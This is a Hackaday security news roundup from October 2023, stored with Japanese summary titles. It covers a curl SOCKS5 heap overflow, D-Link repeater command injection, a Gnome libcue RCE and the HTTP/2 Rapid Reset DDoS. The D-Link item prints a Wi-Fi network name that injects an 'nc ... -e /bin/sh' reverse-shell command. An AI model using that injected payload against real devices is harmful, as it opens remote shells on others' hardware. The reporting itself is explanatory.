{"pubDate": "2023-10-13T14:00:25", "original_title": "This Week in Security: Curl Reveal, Rapid Reset DDoS, and Libcue", "link": "https://hackaday.com/2023/10/13/this-week-in-security-curl-reveal-rapid-reset-ddos-and-libcue/", "source": "https://hackaday.com/blog/feed/", "thumbnail": "https://hackaday.com/wp-content/uploads/2016/01/darkarts.jpg", "original_content": "Curl gave us all a big warning that a severe security problem had been found in that code-base. Given the staggering number of Curl installs around the world, we held our collective breath and waited for the bombshell to drop this Wednesday. It turns out, its not quite as bad as feared  so long as you dont have a SOCKS proxy.\nIn hindsight, shipping a heap overflow in code installed in over twenty billion instances is not an experience I would recommend.  Daniel Stenberg\nThe trouble started when the SOCKS5 proxy support was converted to a non-blocking implementation. Its a win for libcurl to work on requests asynchronously, but refactoring code and new features always runs a bit of risk. SOCKS5 proxying has some quirks, like allowing DNS resolution to happen locally or at the proxy. The new async code starts out with:\nbool socks5_resolve_local =\n(proxytype == CURLPROXY_SOCKS5) ? TRUE : FALSE;\nFirst off, unnecessary ternary is unnecessary. But note that this local variable gets set by the proxytype. If thats CURLPROXY_SOCKS5_HOSTNAME, then it uses remote resolution. But inherited from old code is a check for a hostname that is too long for a SOCKS request (255 bytes). This code converts back to local resolution in this case.\nThe important detail here is that this function is now a state machine, that potentially runs multiple times for a single request, to achieve that asynchronous execution. The check for a too-long hostname only happens during the initialization state. Copying the hostname into the buffer happens in a different state. If setting up the connection takes enough time, the function will return and be executed again when something has changed. The ternary check runs again, but not the hostname-too-long. So if set to do remote resolution with a long enough host name, execution slips through this edge case, and the long hostname is copied into a too-small buffer.\nIts safe to assume that this heap overflow can result in arbitrary code execution. The fix has landed in 8.4.0, after being present for 1,315 days. [Daniel] goes ahead and gets ahead of the inevitable suggestion that Curl should be written in rust or another memory-safe language. Curl was started before those alternatives existed, and there is a very slow effort to move portions of the project to memory-safe languages. And youre welcome to help out.\nRouter Executes WiFi\nIts never a good sign when scanning for WiFi networks crashes your router. But when its an apostrophe that causes the problem, you might have something interesting.\n\nOne of our pentesters recently got a new D-Link DAP-X1860 repeater, which they couldn't setup.This was caused by a neighbor's Wi-Fi containing a single tick in their Wi-Fi name (Olaf's WiFi), resulting in the following error while scanning for access points: pic.twitter.com/c7hSk53RAH\n RedTeam Pentesting (@RedTeamPT) October 9, 2023\n\nThe culprit here is a function that writes Access Point info to a temporary file. The data is constructed into a single command that uses echo to write to the file. And that means command injection. So yes, name a network ' nc notebook 1337 -e /bin/sh  and get a remote shell.\nRedTeam Pentesting tried to report the vulnerability to D-Link for three months, and never received a response. As a result, these issues are now publicly released, and no patches are available. If you have a D-Link wireless device, it might be worth testing the Proof of Concept (PoC). And I think D-Link has officially made the ignominious list of hardware to never run stock firmware on.\nGnome Hit With Libcue\nTheres a nasty issue in Gnome, where merely downloading a file can result in Remote Code Execution (RCE). The vulnerability is in libcue, a parser for cue sheets. Its a straightforward issue, where a value overflows the max value of a signed integer, to become a negative value. That value is then used to index an array, and a negative value writes to an unsafe location outside the array. The value to be written is also taken from the cue file, making exploitation fairly easy.\nWhere this really gets ugly is in the Gnome desktop, where the tracker-miners service runs by default. This is essentially a search index tool. The problem is that it automatically runs parsing libraries for found files, and one of its search locations is in Downloads. And thats the exploit. Download a .cue file, it gets indexed, and the library executes arbitrary code when parsing the download. Patches are available, and are making their way through the distributions to arrive at our desktops.\nRapid Reset\nCloudflare observed a novel Distributed Denial of Service (DDoS) attack in the wild, and it might not be what you expected. The headline is that this is a record-breaking DDoS resulting from an http/2 0-day. Most record-breaking DDoS attacks are based on reflection, but this one is a bit different.\nDiving into the technical details tells the tale. HTTP/2 allows multiple requests to be combined, and the responses to be interleaved on a single TCP connection. Each of those request/response flows are tracked as streams, and theres a limit on how many streams a single client can have open.\nThe interesting bit is that a client can send a stream reset request, which immediately frees that stream from the perspective of the max concurrent streams limit. But theres a service behind that HTTP/2 connection, and it takes a bit of time to tear down the backend connections. If, like Cloudflare, you have a mid-stream proxy like Nginx in the mix, that imbalance can make quite a difference. Make many requests, then start resetting and restarting each of them, and you end up sending way more traffic down an HTTP/2 connection than is intended.\nBits and Bytes\nTheres a new challenge for all you aspiring cryptographers. NIST publishes a handful of elliptic curves that were generated from NSA-provided hashes. These in turn were generated from something, probably sentences in English. But what sentences? Thats the challenge, and there twelve grand in US dollars to whoever can crack the nut first.\nCant stop, wont stop  Cisco, apparently. Yeah, once again, Cisco has to issue a security warning over hard-coded credentials in production software. Cisco is dangerously close to joining D-link on that list.\nSending your DNA to a big company, to get neat ancestry info  what could possibly go wrong? Credential stuffing, breaking into accounts, and then using that access to scrape info from other accounts that opted in to the DNA Relatives service. 23 and Me has released a statement, re-affirming that there wasnt a wider breach, and suggesting that all users use multi-factor authentication. Regardless, theres a claimed database of a million users leaked online, with more than that available for purchase. Its not been confirmed if that is actual real data.", "title": "1.\u300cCurl\u306e\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u554f\u984c\u767a\u898b\uff01\u672c\u5f53\u306f\u305d\u3093\u306a\u306b\u60aa\u304f\u306a\u3044\u3051\u3069SOCKS\u30d7\u30ed\u30ad\u30b7\u306b\u8981\u6ce8\u610f\uff01\u300d", "body": "Curl\u306e\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u554f\u984c\u306f\u4e88\u60f3\u307b\u3069\u6df1\u523b\u3067\u306f\u306a\u304b\u3063\u305f\u304c\u3001SOCKS\u30d7\u30ed\u30ad\u30b7\u3067\u306f\u30ea\u30e2\u30fc\u30c8\u306e\u554f\u984c\u304c\u767a\u751f\u3059\u308b\u53ef\u80fd\u6027\u304c\u3042\u3063\u305f\u3002D-Link\u306e\u30eb\u30fc\u30bf\u30fc\u306fWiFi\u306e\u30b9\u30ad\u30e3\u30f3\u3067\u30af\u30e9\u30c3\u30b7\u30e5\u3059\u308b\u3002Gnome\u306elibcue\u306b\u306fRCE\u306e\u8106\u5f31\u6027\u304c\u3042\u308a\u3001.cue\u30d5\u30a1\u30a4\u30eb\u3092\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9\u3059\u308b\u3068\u4efb\u610f\u306e\u30b3\u30fc\u30c9\u304c\u5b9f\u884c\u3055\u308c\u308b\u3002Cloudflare\u306fHTTP/2\u306e0-day\u653b\u6483\u306b\u906d\u9047\u3057\u3001Cisco\u306f\u30cf\u30fc\u30c9\u30b3\u30fc\u30c9\u3055\u308c\u305f\u8cc7\u683c\u60c5\u5831\u306e\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u8b66\u544a\u3092\u767a\u884c\u3057\u3066\u3044\u307e\u3059\u3002", "titles": ["1.\u300cCurl\u306e\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u554f\u984c\u767a\u898b\uff01\u672c\u5f53\u306f\u305d\u3093\u306a\u306b\u60aa\u304f\u306a\u3044\u3051\u3069SOCKS\u30d7\u30ed\u30ad\u30b7\u306b\u8981\u6ce8\u610f\uff01\u300d", "2.\u300cD-Link\u306eWiFi\u30ea\u30d4\u30fc\u30bf\u30fc\u306b\u30b3\u30de\u30f3\u30c9\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u306e\u8106\u5f31\u6027\uff01\u300d", "3.\u300cGnome\u306b\u60aa\u8cea\u306acue\u30d5\u30a1\u30a4\u30eb\u3092\u30c0\u30a6\u30f3\u30ed\u30fc\u30c9\u3059\u308b\u3068RCE\u304c\u767a\u751f\uff01\u300d", "4.\u300c\u65b0\u305f\u306aDDoS\u653b\u6483\u767a\u899a\uff01\u30af\u30e9\u30a6\u30c9\u30d5\u30ec\u30a2\u304c\u898b\u3064\u3051\u305fhttp/2 0-day\u300d", "5.\u300c23 and Me\u306e\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u6d41\u51fa\uff1f\u907a\u4f1d\u60c5\u5831\u306e\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u554f\u984c\u300d"]}